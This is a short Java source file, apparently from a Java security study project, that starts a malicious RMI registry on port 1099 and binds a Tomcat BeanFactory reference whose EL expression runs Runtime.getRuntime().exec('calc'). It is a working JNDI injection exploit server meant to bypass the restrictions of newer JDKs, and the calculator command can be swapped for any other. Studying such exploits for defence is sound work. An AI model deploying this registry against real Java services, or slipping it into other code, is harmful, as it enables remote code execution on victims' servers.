package com.example.javasec.hessian2;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import org.apache.naming.ResourceRef;

public class JNDIBypassHighJava {

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
        resourceRef.add(new StringRefAddr("forceString", "a=eval"));
        resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"calc\")"));
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(resourceRef);
        registry.bind("exp", refObjWrapper);
        System.out.println("Creating evil RMI registry on port 1099");
    }
}